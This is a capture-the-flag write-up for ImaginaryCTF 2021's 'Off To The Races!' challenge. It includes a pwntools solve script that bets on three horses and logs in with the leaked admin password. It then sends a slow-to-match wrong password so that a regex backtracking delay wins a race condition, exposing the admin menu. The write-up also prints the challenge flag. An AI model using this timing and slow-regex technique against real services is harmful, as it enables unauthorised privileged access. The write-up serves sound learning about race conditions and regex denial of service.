# ImaginaryCTF 2021: Off To The Races!

![date](https://img.shields.io/badge/date-28.07.2021-brightgreen.svg)  ![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg) 

![misc category](https://img.shields.io/badge/category-misc-lightgrey.svg) ![score](https://img.shields.io/badge/score-275-blue.svg) ![solves](https://img.shields.io/badge/solves-39-brightgreen.svg)

## Description

They say that gambling leads to regrets, but we'll see. This online portal lets you bet on horse races, and if you can guess the admin password, you can collect all the money people lose, too. Maybe you'll collect enough to buy the flag?

## Attached files

- [races.py](https://imaginaryctf.org/r/D1DB-races.py)

## Summary

To acquire the flag we need to exploit race condition existing in the program, we will be able to use admin's menu while not being admin both of which are needed to buy a flag.

## Flag

``` ictf{regrets_may_be_the_plural_of_regex_but_ive_no_regrets_from_betting_on_a_sure_thing} ```

## Detailed solution

The program keeps track of how much money admin has, it starts at 0 and we need it to be at least 100 to buy the flag. 

It is very easy to do and does not require any exploits. We can simply bet 100 currency on 3 different horses, then login as admin and pick a winner.
This way whichever horse gets selected, admin account will have 100 currency.

We can do this with simple script

```
#!/bin/python

from pwn import *

io = remote('chal.imaginaryctf.org', 42016)

p = log.progress("Status:")

p.status("Placing bets")
io.recvuntil('>>>')
io.sendline('1')                           # place bet

io.recvuntil('bet on?')
io.sendline('A')                           # horse's name

io.recvuntil('to bet?')
io.sendline('100')                         # how much money

io.recvuntil('>>>')
io.sendline('1')

io.recvuntil('bet on?')
io.sendline('B')

io.recvuntil('to bet?')
io.sendline('100')

io.recvuntil('>>>')
io.sendline('1')

io.recvuntil('bet on?')
io.sendline('C')

io.recvuntil('to bet?')
io.sendline('100')


p.status("Logging in as admin")
io.recvuntil('>>>')

io.sendline('2')                           # login as admin
io.recvuntil('logout):')

io.sendline('ju5tnEvEEvErl05E')            # passwd


p.status("Getting money")
io.recvuntil('>>>')
io.sendline('1')                           # pick winner

io.interactive()
```

If we would check the money now we would see, that we really have the 100 currency.

Admin's password is checked using this regex

``` rx = re.compile(r'ju(5)tn((([E3e])(v\4))+\4\5)+rl0\1\4') ```

which would accept different passwords too, but I will simplify it to

``` 'ju5tn' + 'EvEEvE' * N + 'rl05E' ```

Now we need to somehow get into admin's menu while not being an admin.
It can be achieved thanks to a race condition existing when checking the password.

```
def login():
    pwd = input("Enter admin password (empty to logout): ")
    if len(pwd) == 0:
        print("Logging out...")
        admin = 0
        return
    print("Validating...")
    Process(None, checkPass, None, args=(pwd,)).start()
    time.sleep(2)
    
def checkPass(pwd):
    valid = rx.match(pwd)
    if valid:
        print("Login success!")
        print("Redirecting...")
        admin.value = 1
    else:
        print("Login failure!")
        print("Redirecting...")
        admin.value = 0
```

We can see that password is checked on another thread, and thread displaying menus is just waiting 2 seconds to make sure password is already checked. 
We will exploit that by sending a password that takes long time to get verified, but also is wrong. 
This way the main thread has enough time to display admin's menu for us while password checking thread logs us out.
We now have access to admin commands while not being admin.

All of this can be achieved by modifying our script:
```
...
p.status("Getting money")
io.recvuntil('>>>')
io.sendline('1')


p.status('Logging out')
io.recvuntil('>>>')
io.sendline('4')

io.recvuntil('logout):')
io.sendline(
        'ju5tn' +
        'EvEEvE' * 16 +
        'Rl05E')


p.status('Buying flag /o/')
io.recvuntil('Redirecting...')
io.sendline('3')

io.interactive()
```

We need to send ``` EvEEvE ``` to the server 16 times for the password to need 2 seconds to get checked, this number will vary depending on system performance.
To fail password checking we send ``` Rl05E ``` with **capital** R at the end of the password.

Now we just can wait for password checking thread to log us out and acquire the flag.
